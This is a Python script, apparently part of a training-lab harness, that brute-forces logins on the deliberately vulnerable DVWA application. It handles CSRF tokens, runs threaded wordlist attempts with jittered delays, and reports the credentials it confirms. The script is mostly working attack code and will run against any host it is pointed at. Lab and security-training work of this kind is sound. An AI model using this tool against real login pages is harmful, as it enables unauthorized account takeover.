#!/usr/bin/env python3
"""DVWA brute-page credential tester for the Lab-in-a-Box DVWA target.

Logs into the DVWA instance you point --host/--port at as the built-in admin
(admin/password, or DVWA_ADMIN_USER/DVWA_ADMIN_PASS env), then GETs the
brute-force page with username/password pairs and reports which authenticate.
Success is detected by the "Welcome to the password protected area" page text.
A CSRF `user_token` is sniffed from the brute page when present (DVWA high
level adds one; low/medium do not).

This only ever attacks the host/port it is given — it is NOT wired to the
user's own DVWA at :4280.

Output contract (parsed by labctl/brute.py):
  * `[+] <user>:<password>`   for each confirmed login
  * `[*] attempts=N confirmed=N failures=N errors=N` summary line

Usage:
    python dvwa_brute.py --host HOST --port PORT \
        --usernames FILE --passwords FILE [options]
"""
import argparse
import os
import random
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

TOKEN_RE = re.compile(r"name=['\"]user_token['\"][^>]*value=['\"]([^'\"]*)['\"]")
SUCCESS_TEXT = 'Welcome to the password protected area'


class DVWABruteForcer:
    def __init__(self, base, admin_user, admin_pass, usernames_file, passwords_file,
                 threads=1, delay=0.5, timeout=10.0, retries=1):
        self.base = base
        self.admin_user = admin_user
        self.admin_pass = admin_pass
        self.usernames_file = usernames_file
        self.passwords_file = passwords_file
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.retries = retries
        self.lock = threading.Lock()
        self.counters = {'attempts': 0, 'confirmed': 0, 'failures': 0, 'errors': 0}
        self.auth_cookies = None
        self.csrf_token = None

    def read_wordlist(self, path):
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            return [line.strip() for line in f if line.strip()]

    def _count(self, key):
        with self.lock:
            self.counters[key] += 1

    def login(self):
        s = requests.Session()
        r = s.get(f"{self.base}/login.php", timeout=self.timeout)
        m = TOKEN_RE.search(r.text)
        token = m.group(1) if m else None
        if not token:
            raise SystemExit("could not find login CSRF token")
        r = s.post(
            f"{self.base}/login.php",
            data={'username': self.admin_user, 'password': self.admin_pass,
                  'user_token': token, 'Login': 'Login'},
            allow_redirects=False, timeout=self.timeout,
        )
        if 'index.php' not in r.headers.get('Location', ''):
            raise SystemExit(f"DVWA login failed as {self.admin_user}")
        self.auth_cookies = dict(s.cookies)
        self._refresh_token()

    def _refresh_token(self):
        try:
            s = requests.Session()
            s.cookies.update(self.auth_cookies)
            r = s.get(f"{self.base}/vulnerabilities/brute/index.php",
                      timeout=self.timeout)
            m = TOKEN_RE.search(r.text)
            self.csrf_token = m.group(1) if m else None
        except requests.RequestException:
            self.csrf_token = None

    def attempt(self, username, password):
        self._count('attempts')
        for n in range(1 + self.retries):
            try:
                s = requests.Session()
                s.cookies.update(self.auth_cookies)
                params = {'username': username, 'password': password, 'Login': 'Login'}
                if self.csrf_token:
                    params['user_token'] = self.csrf_token
                r = s.get(f"{self.base}/vulnerabilities/brute/index.php",
                          params=params, timeout=self.timeout)
            except requests.RequestException as exc:
                if n == self.retries:
                    self._count('errors')
                    print(f"[!] {username}:{password}: {exc}")
                    return None, username, password
                time.sleep(min(0.5 * 2 ** n, 8))
                continue
            if SUCCESS_TEXT in r.text:
                self._count('confirmed')
                return True, username, password
            self._count('failures')
            return False, username, password
        return None, username, password

    def brute_force(self):
        found = []
        usernames = self.read_wordlist(self.usernames_file)
        passwords = self.read_wordlist(self.passwords_file)
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self.attempt, u, p): (u, p)
                       for u in usernames for p in passwords}
            for future in as_completed(futures):
                if self.delay:
                    time.sleep(self.delay * random.uniform(0.5, 1.5))
                ok, u, p = future.result()
                if ok:
                    found.append((u, p))
                    print(f"[+] {u}:{p}")
        return found

    def run(self):
        self.login()
        found = self.brute_force()
        with self.lock:
            c = self.counters
            print(f"[*] attempts={c['attempts']} confirmed={c['confirmed']} "
                  f"failures={c['failures']} errors={c['errors']}")
        print("Found credentials:" if found else "No successful logins found.")
        for u, p in found:
            print(f"  {u}:{p}")


def build_parser():
    parser = argparse.ArgumentParser(
        description='DVWA brute-page credential tester (authorized testing only)')
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--usernames', required=True)
    parser.add_argument('--passwords', required=True)
    parser.add_argument('--threads', type=int, default=1)
    parser.add_argument('--delay', type=float, default=0.5)
    parser.add_argument('--timeout', type=float, default=10.0)
    parser.add_argument('--retries', type=int, default=1)
    return parser


def parse_args(argv=None):
    return build_parser().parse_args(argv)


if __name__ == '__main__':
    a = parse_args()
    DVWABruteForcer(
        base=f"http://{a.host}:{a.port}",
        admin_user=os.environ.get("DVWA_ADMIN_USER", "admin"),
        admin_pass=os.environ.get("DVWA_ADMIN_PASS", "password"),
        usernames_file=a.usernames, passwords_file=a.passwords,
        threads=a.threads, delay=a.delay, timeout=a.timeout, retries=a.retries,
    ).run()
